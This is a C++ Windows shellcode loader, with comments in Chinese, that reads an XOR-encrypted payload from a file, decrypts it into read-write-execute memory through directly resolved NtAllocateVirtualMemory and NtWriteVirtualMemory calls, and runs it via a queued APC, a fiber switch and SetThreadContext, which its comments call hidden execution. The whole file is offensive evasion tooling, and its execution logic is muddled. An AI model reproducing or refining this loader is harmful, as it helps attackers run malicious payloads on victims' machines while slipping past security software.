#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// 定义NT函数指针
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemoryPtr)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* NtWriteVirtualMemoryPtr)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

// XOR解密函数
void XORDecrypt(char* data, size_t length, char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key; // 用XOR逐字节解密
    }
}

// 从文件加载shellcode
std::vector<char> LoadShellcodeFromFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Failed to open shellcode file");
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return buffer;
}

// 直接调用NT分配内存函数
PVOID AllocateMemoryViaNT(SIZE_T size) {
    NtAllocateVirtualMemoryPtr NtAllocateVirtualMemory =
        (NtAllocateVirtualMemoryPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

    PVOID shellcodeAddr = nullptr;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &shellcodeAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << status << std::endl;
        return nullptr;
    }

    return shellcodeAddr;
}

// 逐字节复制和解密shellcode
bool WriteAndDecryptShellcodeViaNT(PVOID shellcodeAddr, const std::vector<char>& encryptedShellcode, char xorKey) {
    NtWriteVirtualMemoryPtr NtWriteVirtualMemory =
        (NtWriteVirtualMemoryPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");

    SIZE_T written;
    char decryptedByte;
    for (size_t i = 0; i < encryptedShellcode.size(); i++) {
        decryptedByte = encryptedShellcode[i] ^ xorKey; // 逐字节解密

        NTSTATUS status = NtWriteVirtualMemory(
            GetCurrentProcess(),
            (PVOID)((char*)shellcodeAddr + i),
            &decryptedByte,
            sizeof(decryptedByte),
            &written
        );

        if (status != 0) {
            std::cerr << "NtWriteVirtualMemory failed with status: " << status << std::endl;
            return false;
        }
    }

    return true;
}

// 使用SetThreadContext进行隐蔽的shellcode执行
void __stdcall ShellcodeRoutine(ULONG_PTR dwParam) {
    std::cout << "Shellcode is running (hidden execution via SetThreadContext)!" << std::endl;

    // 获取当前线程的上下文
    CONTEXT context;
    context.ContextFlags = CONTEXT_CONTROL;

    HANDLE hThread = GetCurrentThread();

    // 获取线程上下文，调整EIP/RIP以跳转到我们的shellcode
    if (GetThreadContext(hThread, &context)) {
#ifdef _WIN64
        // 对于64位系统，修改RIP
        context.Rip = (DWORD64)dwParam;
#else
        // 对于32位系统，修改EIP
        context.Eip = (DWORD)dwParam;
#endif
        // 设置上下文，跳转到机器码执行
        SetThreadContext(hThread, &context);
    }

    // 线程进入警觉状态，等待shellcode执行完成
    SleepEx(0, TRUE);
}

// APC注入执行shellcode
void InjectShellcodeViaAPC(PVOID shellcodeAddr) {
    // 创建纤程
    auto fiber = ConvertThreadToFiber(nullptr);
    if (fiber == nullptr) {
        std::cerr << "Error creating fiber: " << GetLastError() << std::endl;
        return;
    }

    // 将APC注入到当前线程中
    DWORD_PTR param = (DWORD_PTR)shellcodeAddr;
    if (!QueueUserAPC((PAPCFUNC)ShellcodeRoutine, GetCurrentThread(), param)) {
        std::cerr << "Failed to queue APC: " << GetLastError() << std::endl;
        return;
    }

    // 切换到纤程，执行APC
    SwitchToFiber(fiber);

    // 将纤程还原为普通线程
    ConvertFiberToThread();
}

int main() {
    // 定义XOR解密的key
    char xorKey = 0xAA;

    // 从文件加载加密的shellcode
    std::vector<char> encryptedShellcode;
    try {
        encryptedShellcode = LoadShellcodeFromFile("encrypted_shellcode.data");
    } catch (const std::exception& ex) {
        std::cerr << ex.what() << std::endl;
        return 1;
    }

    // 分配内存
    PVOID shellcodeAddr = AllocateMemoryViaNT(encryptedShellcode.size());
    if (!shellcodeAddr) {
        return 1;
    }

    // 逐字节解密并复制shellcode到内存
    if (!WriteAndDecryptShellcodeViaNT(shellcodeAddr, encryptedShellcode, xorKey)) {
        return 1;
    }

    // 注入APC执行机器码
    InjectShellcodeViaAPC(shellcodeAddr);

    // 防止主线程立即退出
    SleepEx(1000, TRUE);
    return 0;
}
